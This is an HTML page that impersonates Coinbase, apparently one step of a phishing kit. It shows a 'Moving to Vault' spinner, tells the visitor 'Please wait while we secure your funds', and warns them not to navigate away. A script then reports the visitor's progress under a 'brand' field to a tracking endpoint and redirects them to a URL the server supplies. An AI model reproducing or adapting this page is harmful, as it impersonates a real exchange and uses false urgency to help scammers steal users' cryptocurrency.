<!doctype html>
<html lang="en" class="dark" style="color-scheme: dark;">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Coinbase — Moving to Vault</title>
<link rel="icon" href="https://coinbase.com/favicon.ico">
<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
<style>
.rv-main{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px;background:rgb(10,11,13)}
.rv-card{width:100%;max-width:400px;background:rgba(255,255,255,.02);border-radius:16px;box-shadow:0 0 0 1px rgba(138,145,158,.2) inset;padding:48px 32px;box-sizing:border-box;text-align:center}
.rv-spin-wrap{width:56px;height:56px;margin:0 auto 24px;position:relative}
.rv-spin{width:56px;height:56px;border:3px solid rgba(138,145,158,.25);border-top-color:rgb(87,139,250);border-radius:50%;animation:rv-spin .9s linear infinite}
@keyframes rv-spin{to{transform:rotate(360deg)}}
.rv-title{color:#fff;font-size:22px;font-weight:600;margin:0}
.rv-sub{color:#94a3b8;font-size:14px;margin:10px 0 0;line-height:1.5}
.rv-warn{color:#f87171;font-size:13px;font-weight:600;margin-top:20px}
</style>
</head>
<body style="font-family:'CoinbaseSansFont',system-ui,sans-serif;margin:0">
<div class="rv-main">
  <svg width="36" height="36" viewBox="0 0 48 48" aria-label="Coinbase" style="position:absolute;top:24px;left:24px"><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#fff"/></svg>
  <div class="rv-card">
    <div class="rv-spin-wrap"><div class="rv-spin"></div></div>
    <h1 class="rv-title">Moving to Vault</h1>
    <p class="rv-sub">Please wait while we secure your funds.</p>
    <p class="rv-warn">Do not navigate away from this page!</p>
  </div>
</div>
<script>
setTimeout(function(){
  fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Moving Vault',choice:'completed'})})
    .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;});
}, 3500);
</script>
</body>
</html>
